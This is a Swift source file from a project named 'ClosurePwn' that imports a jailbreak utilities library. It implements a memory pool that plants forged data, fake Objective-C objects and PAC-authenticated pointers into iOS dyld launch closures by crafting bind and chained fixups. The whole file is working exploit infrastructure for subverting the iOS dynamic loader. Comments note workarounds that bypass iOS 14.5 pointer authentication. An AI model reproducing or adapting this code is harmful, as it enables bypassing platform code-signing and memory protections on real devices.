//
//  ClosureMemoryPool.swift
//  ClosurePwn
//
//  Created by Linus Henze.
//  Copyright © 2021 Linus Henze. All rights reserved.
//

import Foundation
import JailbreakUtils

public enum PACKey {
    case none
    case IA(context: UInt16 = 0, derived: Bool = false)
    case IB(context: UInt16 = 0, derived: Bool = false)
    case DA(context: UInt16 = 0, derived: Bool = false)
    case DB(context: UInt16 = 0, derived: Bool = false)
}

public struct ClosureMemoryDescriptor {
    public var offset: UInt64
    public var target: ResolvedSymbolTarget
    public var pacKey: PACKey
    
    public init(offset: UInt64, target: ResolvedSymbolTarget, pacKey: PACKey = .none) {
        self.offset = offset
        self.target = target
        self.pacKey = pacKey
    }
    
    public static func `class`(offset: UInt64, className: String) throws -> ClosureMemoryDescriptor {
        return .init(offset: offset, target: try SharedCache.running.offsetOfObjCClass(className), pacKey: .DA(context: 0x6ae1, derived: true))
    }
}

public enum MemoryPoolError: Error {
    case outOfMemory
    case invalidArgument(arg: Any, description: String)
    case invalidImage
    case unalignedPACPointer
    case badPACKey(key: PACKey)
}

open class ClosureMemoryPool {
    public let imageNumber: UInt32
    public let imageOffset: UInt64
    public var poolSize: UInt64
    
    public private(set) var currentOffset: UInt64 = 0
    private var objects: [ClosureMemoryObject] = []
    
    public init(imageNumber: UInt32, offset: UInt64, size: UInt64) {
        self.imageNumber = imageNumber
        imageOffset = offset
        poolSize = size
    }
    
    public convenience init(image: Image, offset: UInt64, size: UInt64) {
        self.init(imageNumber: image.imageNumber!, offset: offset, size: size)
    }
    
    /**
     * Allocate some memory. Returns start offset.
     */
    public func alloc(withSize size: UInt64) throws -> UInt64 {
        var size = size
        while (size % 8) != 0 {
            // Align size
            size += 1
        }
        
        if (currentOffset + size) > poolSize {
            throw MemoryPoolError.outOfMemory
        }
        
        let res = currentOffset + imageOffset
        
        currentOffset += size
        
        return res
    }
    
    public func allocAtEnd(withSize size: UInt64) throws -> UInt64 {
        var size = size
        while (size % 8) != 0 {
            // Align size
            size += 1
        }
        
        if currentOffset >= (poolSize - size) {
            throw MemoryPoolError.outOfMemory
        }
        
        poolSize -= size
        
        return imageOffset + poolSize
    }
    
    private func registerMemoryObject(_ obj: ClosureMemoryObject) {
        objects.append(obj)
    }
    
    /**
     * Append a PoolEncodeable and convert it into a ClosureMemoryObject (if there is enough space)
     */
    @discardableResult
    public func append(object: PoolEncodeable) throws -> ClosureMemoryObject {
        return try object.toMemoryObject(memoryPool: self)
    }
    
    private func pacDescToBindPatterns(_ desc: ClosureMemoryDescriptor, ordinal: Int, next: UInt16) throws -> [BindFixups.BindPattern] {
        // Convert PAC Key
        
        var key = ChainedFixups.ChainedStartsInSegment.ChainTarget.PACKey.IA
        var diversity: UInt16 = 0
        var addrDiv: Bool = false
        
        switch desc.pacKey {
        case .IA(context: let context, derived: let derived):
            key = .IA
            diversity = context
            addrDiv = derived
            
        case .IB(context: let context, derived: let derived):
            key = .IB
            diversity = context
            addrDiv = derived
            
        case .DA(context: let context, derived: let derived):
            key = .DA
            diversity = context
            addrDiv = derived
            
        case .DB(context: let context, derived: let derived):
            key = .DB
            diversity = context
            addrDiv = derived
            
        default:
            // This should never happen
            throw MemoryPoolError.badPACKey(key: desc.pacKey)
        }
        
        let target = ChainedFixups.ChainedStartsInSegment.ChainTarget.authBind(ordinal: UInt16(ordinal), diversity: diversity, addrDiv: addrDiv, key: key, next: next)
        let raw = target.rawValue
        
        // Generate two descriptors
        // The first one writes the low bytes, the second one the upper bytes
        return [
            .init(withTarget: .absolute(address: raw & 0xFF), andVMOffset: desc.offset),
            .init(withTarget: .absolute(address: raw >> 8), andVMOffset: desc.offset + 1)
        ]
    }
    
    public func writeInto(closure: LaunchClosure) throws {
        // Now this is the hard part
        guard let array = closure.imageArray else {
            throw MemoryPoolError.invalidImage
        }
        
        guard let image = array.images.filter({ $0.imageNumber == imageNumber }).first else {
            throw MemoryPoolError.invalidImage
        }
        
        // iOS 14.5 forced me to implement PAC...
        
        // First, get all descriptors
        // Split them into PAC and non-PAC
        var pacDescs: [ClosureMemoryDescriptor] = []
        var descs: [ClosureMemoryDescriptor] = []
        for o in objects {
            for d in o.data {
                if case .none = d.pacKey {
                    descs.append(d)
                } else {
                    // PAC Pointers must be 8-Byte aligned
                    guard (d.offset % 8) == 0 else {
                        throw MemoryPoolError.unalignedPACPointer
                    }
                    
                    pacDescs.append(d)
                }
            }
        }
        
        if pacDescs.count == 0 {
            descs.sort(by: { $0.offset < $1.offset })
            
            // Ok then, no PAC
            let bindFixups: BindFixups = image.getOrCreateChild(type: 21)
            for d in descs {
                bindFixups.patterns.append(.init(withTarget: d.target, andVMOffset: d.offset))
            }
            
            return
        }
        
        // Sort the PAC array
        pacDescs.sort { $0.offset < $1.offset }
        
        // Generate a new empty bind array
        var binds: [BindFixups.BindPattern] = []
        
        // Build our chained fixups entry
        let chEntry: ChainedFixupsEntry = image.getOrCreateChild(type: 27)
        
        // Now build the chained fixups
        // This requires us to prepend some data
        // Also record the first entry in the chain
        var chainStart: UInt64!
        for i in 0..<pacDescs.count {
            let d = pacDescs[i]
            var next: UInt16 = 0
            if (i+1) < pacDescs.count {
                let other = pacDescs[i+1]
                next = UInt16((other.offset - d.offset) >> 3)
            }
            
            // First get the ordinal
            let ordinal = chEntry.targets.count
            
            // Append the entry for this ordinal
            chEntry.targets.append(d.target)
            
            // Append bind patterns
            binds.append(contentsOf: try pacDescToBindPatterns(d, ordinal: ordinal, next: next))
            
            if chainStart == nil {
                // Record first offset
                chainStart = d.offset
            }
        }
        
        // Now append the normal descs
        for d in descs {
            binds.append(.init(withTarget: d.target, andVMOffset: d.offset))
        }
        
        // Sort the array
        // This prevents unaligned writes from trashing anything else
        binds.sort { $0.startVmOffset < $1.startVmOffset }
        
        // Now prepare the chained fixups start payload
        let startOff = try alloc(withSize: 64)
        
        // struct dyld_chained_starts_in_image
        binds.append(.init(withTarget: .absolute(address: 1), andVMOffset: startOff)) // seg_count -> 1
        binds.append(.init(withTarget: .absolute(address: 8), andVMOffset: startOff + 4)) // seg_info_offset -> comes directly after this
        
        // struct dyld_chained_starts_in_segment
        binds.append(.init(withTarget: .absolute(address: 0x18), andVMOffset: startOff + 8)) // size -> XXX
        binds.append(.init(withTarget: .absolute(address: 0x4000), andVMOffset: startOff + 12)) // page_size -> 0x4000 (arm64 default)
        binds.append(.init(withTarget: .absolute(address: 1), andVMOffset: startOff + 14)) // pointer_format -> 1 (DYLD_CHAINED_PTR_ARM64E)
        binds.append(.init(withTarget: .absolute(address: chainStart), andVMOffset: startOff + 16)) // segment_offset -> first pointer to rebase (technically wrong... works anyway)
        binds.append(.init(withTarget: .absolute(address: 0), andVMOffset: startOff + 24)) // max_valid_pointer -> 0 (not used anymore)
        binds.append(.init(withTarget: .absolute(address: 1), andVMOffset: startOff + 28)) // page_count -> 1 (also a hack...)
        binds.append(.init(withTarget: .absolute(address: 0), andVMOffset: startOff + 30)) // offset -> 0 (segment_offset directly points to first pointer)
        
        // Create chained fixups start entry
        let chStart: ChainedFixupsStart = image.getOrCreateChild(type: 29)
        chStart.start = startOff
        
        // Mark image as having chained fixups
        image.flags!.hasChainedFixups = true
        
        // Create the bind fixups
        let bindFixups: BindFixups = image.getOrCreateChild(type: 21)
        bindFixups.patterns = binds
    }
    
    public func getStrRef(_ str: String) throws -> ResolvedSymbolTarget {
        return try append(object: str).reference
    }
    
    public func getNSStrRef(_ str: String) throws -> ResolvedSymbolTarget {
        return try append(object: FakeNSString(str)).reference
    }
    
    public func makeMemoryObject(size: UInt64, data: [ClosureMemoryDescriptor], atEnd: Bool = false) throws -> ClosureMemoryObject {
        let startOffset = try atEnd ? allocAtEnd(withSize: size) : alloc(withSize: size)
        var nData: [ClosureMemoryDescriptor] = []
        for d in data {
            nData.append(.init(offset: d.offset + startOffset, target: d.target, pacKey: d.pacKey))
        }
        
        let res = ClosureMemoryObject(imageNumber: imageNumber, offset: startOffset, size: size, data: nData)
        
        registerMemoryObject(res)
        
        return res
    }
}

open class ClosureMemoryObject {
    public let imageNumber: UInt32
    public let startOffset: UInt64
    public let size: UInt64
    public let data: [ClosureMemoryDescriptor]
    
    public var reference: ResolvedSymbolTarget {
        .image(number: imageNumber, offset: startOffset)
    }
    
    public init(imageNumber: UInt32, offset: UInt64, size: UInt64, data: [ClosureMemoryDescriptor]) {
        self.imageNumber = imageNumber
        self.startOffset = offset
        self.size = size
        self.data = data
    }
}

public protocol PoolEncodeable {
    func toMemoryObject(memoryPool: ClosureMemoryPool) throws -> ClosureMemoryObject
}

extension UInt64: PoolEncodeable {
    public func toMemoryObject(memoryPool: ClosureMemoryPool) throws -> ClosureMemoryObject {
        guard (self >> 62) == 0 else {
            throw MemoryPoolError.invalidArgument(arg: self, description: "Cannot encode integer with high bits set!")
        }
        
        let res = try memoryPool.makeMemoryObject(size: 8, data: [
            .init(offset: 0, target: .absolute(address: self), pacKey: .none)
        ])
        
        return res
    }
}

extension Data: PoolEncodeable {
    public func appendToMemoryDescriptors(offset: UInt64, array: [ClosureMemoryDescriptor]) -> [ClosureMemoryDescriptor] {
        var array = array
        var off = offset
        var curNum: UInt64 = 0
        var curOff = 0
        for b in self {
            if curOff >= 7 {
                array.append(.init(offset: off, target: .absolute(address: curNum), pacKey: .none))
                curNum = 0
                curOff = 0
                off += 7
            }
            
            curNum |= (UInt64(b) << (8 * curOff))
            curOff += 1
        }
        
        array.append(.init(offset: off, target: .absolute(address: curNum), pacKey: .none))
        
        return array
    }
    
    public func toMemoryObject(memoryPool: ClosureMemoryPool) throws -> ClosureMemoryObject {
        guard self.count > 0 else {
            throw MemoryPoolError.invalidArgument(arg: self, description: "Cannot encode empty Data!")
        }
        
        let array = self.appendToMemoryDescriptors(offset: 0, array: [])
        
        return try memoryPool.makeMemoryObject(size: UInt64(self.count), data: array)
    }
}

extension String: PoolEncodeable {
    public func toMemoryObject(memoryPool: ClosureMemoryPool) throws -> ClosureMemoryObject {
        return try (self.data(using: .utf8)! + Data(repeating: 0, count: 1)).toMemoryObject(memoryPool: memoryPool)
    }
}

extension ResolvedSymbolTarget: PoolEncodeable {
    public func toMemoryObject(memoryPool: ClosureMemoryPool) throws -> ClosureMemoryObject {
        return try memoryPool.makeMemoryObject(size: 8, data: [
            .init(offset: 0, target: self, pacKey: .none)
        ])
    }
}
